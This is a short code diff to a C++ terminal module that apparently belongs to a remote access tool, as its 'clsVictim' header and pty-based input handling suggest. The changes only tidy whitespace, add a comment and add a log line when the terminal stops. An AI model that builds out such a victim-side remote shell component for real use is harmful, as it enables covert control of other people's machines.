@@ -11,11 +11,9 @@
 #include <pty.h>
 #include <unistd.h>
 #include <sys/types.h>
-
 #include <sys/ioctl.h>
 
-
-
+//Module.
 #include "clsVictim.hpp"
 #include "clsEZData.hpp"
 #include "clsTools.hpp"
@@ -136,6 +134,8 @@ public:
 
         if (m_ptyFd != -1)
             close(m_ptyFd);
+
+        clsTools::fnLogInfo("Stop terminal successfully.");
     }
 
     void fnPushInput(const std::vector<uint8_t>& data)
